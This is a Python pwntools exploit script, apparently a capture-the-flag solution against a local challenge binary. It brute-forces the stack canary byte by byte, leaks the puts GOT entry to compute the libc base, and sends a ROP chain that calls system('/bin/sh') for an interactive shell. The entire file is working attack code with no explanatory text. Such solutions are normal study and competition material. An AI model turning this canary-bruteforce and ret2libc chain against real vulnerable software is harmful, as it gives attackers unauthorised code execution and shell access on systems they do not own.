# 0x000000000011903c : pop rdi ; ret 			libc
# 0x0000000000401016 : ret

from pwn import *

libc = ELF("./libc.so.6")

EXE_FILENAME = "./chall.elf_patched"
exe = ELF(EXE_FILENAME)
context.binary = exe

#p = gdb.debug([EXE_FILENAME], gdbscript='''
	#set follow-fork-mode child
	#set detach-on-fork off
	#b *make_copy+160
	#b *make_copy+187
#	''')

p = process(EXE_FILENAME)

offset = 24
puts_var = 0x00000000004012D4
puts_var = 0x0000000000401320

def tentativo(canary):
	p.send(b"A" * offset + canary)
	res = p.recvuntil(b"|===-------- - -- - .  .")
	if b"lost." in res:
		return False
	else:
		return True

def create_process():
	p.sendline(b"1")
	p.recvuntil(b"Please confirm operational stability.")
	p.recvuntil(b": ")

def canary_bruteforce():
	canary = b""
	p.recvuntil(b": ")
	create_process()

	while len(canary) < 8:
		for i in range(256):
			tmp = canary + i.to_bytes(1)
			print(f"Trying: 0x{tmp[::-1].hex()}")
			res = tentativo(tmp)
			if res == True:
				canary = tmp
				print(f"Progress: 0x{canary[::-1].hex()}")
				p.recvuntil(b": ")
				p.sendline(b"2")
				p.recvuntil(b"|===-------- - -- - .  .")
				p.recvuntil(b": ")
				create_process()
				break
			if i == 0xff:
				print(":(")
				exit()
			create_process()
	p.sendline(b"garbage")
	p.recvuntil(b": ")
	p.sendline(b"2")
	p.recvuntil(b"|===-------- - -- - .  .")
	p.recvuntil(b": ")
	return canary


def leak(addr):
	create_process()
	payload = flat(
		b"A"*offset,
		canary,
		addr + 0x24,
		puts_var,
		)

	p.sendline(payload)
	p.recvuntil(b"Connection to Mickey-")
	res = p.recvuntil(b" ")[:-1]
	res = int(res.decode())
	if res < 0:
		res = 0xffffffff + res + 1

	print(f"Leak: {hex(res)}")
	p.recvuntil(b"|===-------- - -- - .  .")
	p.recvuntil(b": ")
	return res


canary = canary_bruteforce()
print(f"Puts plt: {hex(exe.plt.puts)}")
canary = int.from_bytes(canary, "little")
print(f"Leaked canary: {hex(canary)}")
#p.recvuntil(b": ")
res1 = leak(exe.got.puts)
res2 = leak(exe.got.puts + 0x4)

leak_ = int(hex(res2) + hex(res1)[2:], 16)
libc_base = leak_ - libc.symbols.puts
pop_rdi = 0x000000000011903c + libc_base
bin_sh = next(libc.search(b"/bin/sh")) + libc_base
ret = 0x0000000000401016


print(f"Leak: {hex(leak_)}")
print(f"Libc base: {hex(libc_base)}")

create_process()
payload = flat(
	b"A"*(offset),
	canary,
	0x0,
	pop_rdi,
	bin_sh,
	ret,
	libc_base+libc.symbols.system,
)
print(f"payload len: {len(payload)}")

p.sendline(payload)
print(f"bin: {hex(bin_sh)}")

p.interactive()